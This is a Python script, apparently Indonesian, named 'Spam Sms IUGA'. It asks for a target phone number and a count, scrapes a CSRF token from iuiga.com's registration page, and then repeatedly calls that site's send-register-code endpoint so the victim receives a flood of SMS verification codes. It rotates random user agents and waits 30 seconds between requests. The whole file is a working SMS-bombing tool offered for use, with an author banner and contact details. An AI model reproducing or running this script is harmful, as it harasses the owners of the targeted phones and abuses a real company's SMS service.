# -*- coding: utf-8 -*-
import requests,json,time,os
from fake_useragent import UserAgent
uat = UserAgent()
r = requests.Session()
def tunggu(t):
        while t:
                wd='[#] Jeda selama '+str(t)+" detik "
                print(wd,end='\r',flush=True)
                time.sleep(1)
                t -= 1
if os.name == 'nt':os.system('cls')
else:os.system('clear')
print("""\n▄█  ███    █▄     ▄██████▄     ▄████████ 
███  ███    ███   ███    ███   ███    ███ 
███▌ ███    ███   ███    █▀    ███    ███ 
███▌ ███    ███  ▄███          ███    ███ 
███▌ ███    ███ ▀▀███ ████▄  ▀███████████ 
███  ███    ███   ███    ███   ███    ███ 
███  ███    ███   ███    ███   ███    ███ 
█▀   ████████▀    ████████▀    ███    █▀  
                                          \n""")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Sms IUGA | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
try:
        no = input("[~] Contoh : 8xxx\n[•] Masukkan nomor target : ")
        nope = no.replace("+62","")
        jml = int(input("[•] Masukkan Jumlah: "))
        from bs4 import BeautifulSoup as bs
        z  = 1
        ua = uat.random
        for x in range(jml):
                a = r.get('https://www.iuiga.com/register.html',headers={'user-agent':ua}).text
                b = bs(a,'html.parser')
                c = b.find("meta",attrs={"name":"csrf-token"})
                d = r.post('https://www.iuiga.com/login/send-register-code',headers={'user-agent':ua},data={"_csrf": c["content"],"phone": nope,"phone_code": "+62","is_login": "0"}).text
                e = json.loads(d)["data"]
                if e["success"] == True:
                        print(f"[{z}] Sukses spam ke {no}")
                        if jml == z:
                                exit()
                        else:
                                tunggu(30)
                        z += 1
                else:
                        print(f"[{z}] Gagal spam ke {no}")
                        if jml == z:
                                exit()
                        else:
                                tunggu(30)
                        z += 1
except KeyboardInterrupt:print(f"\n[!] Bye, jangan di recode ya!!");exit()
except requests.exceptions.ConnectionError:print(f"\n[!] Konekri error, coba lagi!!");exit()
except Exception as e:print('\n[!] Error :',e)
